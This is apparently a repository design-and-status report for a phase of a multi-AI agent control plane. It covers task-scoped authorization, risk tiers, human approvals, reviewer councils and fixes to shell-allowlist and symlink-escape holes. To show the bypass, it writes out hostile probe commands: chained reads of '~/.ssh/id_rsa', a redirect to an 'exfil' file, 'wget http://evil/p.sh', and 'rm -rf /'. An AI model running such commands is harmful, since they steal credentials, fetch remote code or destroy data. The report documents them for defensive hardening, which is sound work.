# Phase 20.16 — Pao-hubPro Multi-AI Control Plane

Status: Core implemented and verified over live HTTP. Dashboard is a working first
slice. Media pipeline is data-model only, by design.

## Why this is 20.16 and not 20.15

The planning document was numbered 20.15, but that number was already taken twice in
this repository: by the Domain Control Plane, and before that by Visual Knowledge &
Media Memory and the End-to-End Stock Pipeline. **20.16** is the next free number.

## What was built, and what was reused

The spec's own instruction — *if an existing subsystem already solves part of the
requirement, reuse it rather than duplicating it* — drove most of the design. This
repository already had a substantial agent runtime in `src/agent-os/desktop-runtime/`,
so the phase **extends** it instead of standing up a parallel stack.

| Spec requirement | What exists | What this phase did |
| --- | --- | --- |
| Path boundary + symlink prevention | `security/path-guard.ts` | **Fixed two exploitable holes** (below) |
| Command policy | `policy/policy-engine.ts` | **Fixed the allowlist bypass**, then reused as the single command authority |
| Risk classification | `tools/risk-classifier.ts` | Added the L0–L3 control-plane taxonomy with a task ceiling |
| Tool registry | `tools/tool-registry.ts` | Reused; new tools live in the control-plane suite |
| Approval gate | `approval/approval-gateway.ts` | Reused shape; the control plane adds task/tool-bound approvals |
| Secret redaction | `security/secret-redactor.ts` | Reused directly — arguments are redacted before storage |
| Reviewer Council | `council/reviewers.ts` | Extended into Council v2 semantics for structured verdicts |
| Provider abstraction | `providers/provider-types.ts` | Reused; media artifacts record their generator |
| MCP security gateway | `mcp/security-gateway.ts` | Reused for MCP server admission |

## The two security holes this phase had to fix first

Both were already in the code path the phase depends on, and both were confirmed
exploitable by direct probe before any fix.

### 1. The shell allowlist was bypassed by a single separator

The allowlist was matched with `clean.toLowerCase().startsWith(allowed)`. That one call
meant a command merely had to *begin* with an allowlisted string:

```text
git status; cat ~/.ssh/id_rsa        -> ALLOWED
git diff > ../exfil.txt              -> ALLOWED
git log && powershell -c Remove-Item -> ALLOWED
bun test || wget http://evil/p.sh    -> ALLOWED
```

Fixed by matching **per simple command**, using a conservative scanner in
`security/shell-tokenizer.ts`. Segments, operators, redirection targets, and
substitutions are decomposed; anything the scanner cannot prove safe escalates to a
human. Interpretation is never auto-approved, because running a named script is only
as safe as the script.

### 2. A symlink escape passed whenever the target file did not exist yet

`PathGuard` canonicalized only paths that already existed. A new file created through a
symlinked directory therefore resolved lexically, passed the containment check, and was
written outside the workspace — and a write tool is exactly the caller that has this
gap. Fixed by resolving the deepest **existing** ancestor and re-attaching the
unresolved remainder.

## A third hole, found by this phase's own validation

After the shell fix, live HTTP testing showed `rm -rf /` still classifying as **L1**
inside the control plane: the tool is sandbox-write and the single-segment parse looked
clean. It would have been auto-approved and executed by `execFileSync`, which needs no
shell to do damage. The control plane now defers to the shell policy engine's verdict
rather than re-implementing the denylist. Verified live: even with a permissive L3 task
ceiling, `rm -rf /` and `git push --force` stay blocked while `git status` runs.

This is the argument for validating on a running system. A unit test written against my
own assumptions passed; the live check did not.

## Design decisions worth knowing

**A task is the unit of authorization.** An agent does not hold machine rights. It
requests a task naming a workspace root, a tool allowlist, and a risk ceiling — and the
ceiling is a maximum, not a floor. Treating it as a floor would make every file read on
an L2 task require approval, and an approval queue that prompts for reading a file
trains an operator to approve without looking.

**One gate, one audit row.** Every tool request passes `ControlPlaneService.requestTool`,
which records its decision *before* acting. A denial is auditable even though nothing
ran. There is no second path to execution.

**Approvals are bound to one task and one tool.** An approval granted for one task
cannot authorize another, and there is deliberately no "always allow" mode.

**A verdict cannot be softer than its own findings.** An `approve` carrying a CRITICAL
issue is downgraded to `changes_requested` automatically, and CRITICAL blocks
application in code rather than in a report someone might skim.

**Disagreement is recorded, not voted away.** With two reviewers a tie has no majority,
and with three an evidence-backed minority is erased by arithmetic. A split is surfaced
as its own item with the risk of each side being wrong.

**No shell is ever granted.** `command.run_safe` and `command.run_approved` parse to an
argv and spawn without a shell. Input that needs a shell — quotes, pipes, redirection —
is refused rather than interpreted.

## Data model

Additive tables on the existing Agent OS SQLite handle: `cp_tasks`, `cp_runs`,
`cp_tool_calls`, `cp_reviews`, `cp_artifacts`, `cp_approvals`, `cp_provider_usage`.

`cp_tool_calls` is append-only by convention — no code path updates or deletes a row.

## Management API

```text
GET  /api/agent-os/control-plane                 command-center summary + metrics
GET  /api/agent-os/control-plane/tasks           list (?status=)
GET  /api/agent-os/control-plane/tasks/{id}      task graph: runs, reviews, consensus, tool calls
GET  /api/agent-os/control-plane/approvals       approval queue
GET  /api/agent-os/control-plane/reviews         reviews for ?task_id=
GET  /api/agent-os/control-plane/tools           tool activity (redacted arguments)
GET  /api/agent-os/control-plane/artifacts       artifact registry
GET  /api/agent-os/control-plane/providers       provider usage
GET  /api/agent-os/control-plane/command/plan    policy verdict for a command, WITHOUT running it
POST /api/agent-os/control-plane/tasks           create a task
POST /api/agent-os/control-plane/approvals/decide grant | deny
```

## MCP tools

Nine groups, as specified: `project`, `task`, `safe_files`, `git`, `command`, `review`,
`approval`, `artifact`, `media`. 39 tools in `src/agent-os/control-plane/mcp-tools.ts`
(project 3, task 5, files 5, git 6, command 3, review 3, approval 3, artifact 5,
media 6).

`git.push` and `artifact.approve` are L3: they can never run without a granted approval,
and force-push is refused outright so no approval can authorize one.

## Dashboard

Command Center at `gui/src/pages/ControlPlane.tsx`, reachable from the sidebar as
**AI Control Plane**. Tabs: Command Center, Task Graph, Approval Center, Tool Activity,
Artifact Studio.

It renders **only** what the backend reports. When the API is unreachable it says so
rather than substituting placeholder rows — an operations page that invents plausible
task counts is worse than one that admits it has no data. The Approval Center offers
Approve Once and Reject, with no blanket allow.

## Routing

| Task type | Leads | Reviewed by |
| --- | --- | --- |
| research | supergrok | chatgpt |
| architecture | chatgpt | grok-expert |
| coding (feature/bugfix/refactor/test) | codex | grok-expert, chatgpt |
| security_review | grok-expert | chatgpt |
| image_concept / video_concept | grok-imagine | chatgpt |
| local_execution | pao-hubpro | — (approval required) |

The reviewer is always a different identity from the primary, and a route configured to
self-review has that reviewer dropped rather than honored.

### Important integration boundary

**A ChatGPT Business or SuperGrok subscription is not a backend API credential.** The
spec says this and it is worth restating: the UI/MCP integrations and the OpenAI/xAI API
integrations are separate paths. Nothing in this phase reads a subscription as an API
key, and `DOMAIN_OSS`-style scoped keys are the only credentials referenced.

## Validation

```bash
bun test tests/agent-tool-security.test.ts tests/control-plane-security.test.ts
bun run typecheck     # strict, clean
bun run privacy:scan  # green
cd gui && bun run lint && bun run build
```

Result: 61 tests pass, 0 fail (158 assertions) for the two security suites. Typecheck
clean. Privacy scan green. GUI lint and build clean.

### Live HTTP verification

Against a running proxy on a throwaway home:

```text
create task          -> status=queued primary=codex reviewers=grok-expert,chatgpt
plan(git status)     -> allowed=True  risk=L1
plan(chained + ~/.ssh/id_rsa) -> allowed=False risk=L3 rule=risk.sensitive
plan(rm -rf /)       -> allowed=False risk=L3   (with a permissive L3 ceiling)
plan(git push --force) -> allowed=False risk=L3
decide unknown approval -> HTTP 409
gate before review   -> allowed=False (No review has been submitted)
```

### Known pre-existing failure

`tests/management-route-registry.test.ts` has one failure ("the scanner resolves a
method for every route guard it finds") that pre-dates this phase and concerns route
guards in other subsystem modules. It contains no control-plane entries. Confirmed by
checking that the failure output names no route from this phase.

## Not done

- **Media generation is data-model only.** Creative briefs, artifact provenance, and QC
  findings are recorded; no image or video provider is called. The spec's media section
  describes a pipeline the repository already has in Phase 19/20.1, and wiring the two
  together was not in scope for this slice.
- **No provider adapters were added.** `provider-types.ts` already defines text, image,
  and video adapter interfaces; nothing new was needed, and adding a parallel set would
  have duplicated them.
- **Autonomous provider routing** is not enabled. Routing is a static table, per the
  spec's MVP scope.
- **Adobe Stock upload** is not automated, as the spec requires.

## Files

```text
src/agent-os/control-plane/
  types.ts        task, run, risk, review, artifact, and audit types
  policy.ts       the gate: L0-L3 classification and the task ceiling
  reviewers.ts    Council v2: verdicts, dedup, blocking, disagreement
  router.ts       role routing that keeps author and reviewer distinct
  store.ts        additive SQLite persistence
  service.ts      THE ONLY PLACE A TOOL REQUEST IS AUTHORIZED
  mcp-tools.ts    the nine-group tool suite
src/agent-os/desktop-runtime/security/shell-tokenizer.ts   NEW: command decomposition
src/agent-os/desktop-runtime/security/path-guard.ts        FIXED: symlink escape
src/agent-os/desktop-runtime/policy/policy-engine.ts       FIXED: allowlist bypass
src/server/management/control-plane-routes.ts              management REST API
gui/src/pages/ControlPlane.tsx + gui/src/styles/control-plane.css   Command Center
```

## Next recommended step

The vertical slice the spec asks for (§32) is now live: a ChatGPT-side planner can
create a task, Codex can be handed an approved coding task in an isolated worktree, the
diff can be reviewed, and a human decides in the Approval Center. The next honest step is
to run that slice end to end with a real Codex implementation task — which needs an
actual provider credential and a real repository change — rather than to add another
surface. Media wiring should follow only after that loop is proven.
